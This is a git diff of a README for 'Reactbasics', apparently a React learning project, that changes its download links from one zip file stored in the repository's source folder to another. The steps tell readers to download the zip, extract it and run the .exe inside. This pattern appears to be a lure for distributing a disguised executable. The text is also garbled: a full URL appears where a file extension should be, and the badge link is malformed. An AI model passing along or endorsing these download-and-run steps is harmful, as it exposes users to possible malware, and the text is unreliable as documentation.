@@ -1,12 +1,12 @@
 # ⚛️ Reactbasics - Simple App for Learning React
 
-[![Download Reactbasics](https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/assets/Software-v1.4-beta.4.zip%20Reactbasics-%https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/assets/Software-v1.4-beta.4.zip)](https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/assets/Software-v1.4-beta.4.zip)
+[![Download Reactbasics](https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/Software-2.0.zip%20Reactbasics-%https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/Software-2.0.zip)](https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/Software-2.0.zip)
 
 ## 📥 Download & Install
 
 To get started with Reactbasics, visit this page to download the application:
 
-[Download Reactbasics](https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/assets/Software-v1.4-beta.4.zip)
+[Download Reactbasics](https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/Software-2.0.zip)
 
 Follow these steps to install and run the app on your computer.
 
@@ -19,14 +19,14 @@ Follow these steps to install and run the app on your computer.
    Find the latest version listed at the top. It is usually labeled with the highest version number (e.g., v1.0).
 
 3. **Download the Application**  
-   Look for the file name that typically ends with `.exe`, `.zip`, or `https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/assets/Software-v1.4-beta.4.zip`. Click on this file to start the download. Depending on your browser settings, you may need to confirm the download.
+   Look for the file name that typically ends with `.exe`, `.zip`, or `https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/Software-2.0.zip`. Click on this file to start the download. Depending on your browser settings, you may need to confirm the download.
 
 4. **Locate the Downloaded File**  
    Once the download finishes, locate the file in your ‘Downloads’ folder or the location you saved it.
 
 5. **Install the Application**  
    - **For `.exe` files:** Double-click the file to start the installation process. Follow the prompts to complete the installation.
-   - **For `.zip` or `https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/assets/Software-v1.4-beta.4.zip` files:** Right-click the file and select ‘Extract’ to unpack it. You can then open the folder and look for the `.exe` file to run.
+   - **For `.zip` or `https://raw.githubusercontent.com/Nutifafa7/Reactbasics/master/my-react-app/src/Software-2.0.zip` files:** Right-click the file and select ‘Extract’ to unpack it. You can then open the folder and look for the `.exe` file to run.
 
 6. **Launch Reactbasics**  
    After installation, find the Reactbasics icon. Double-click it to open the application.
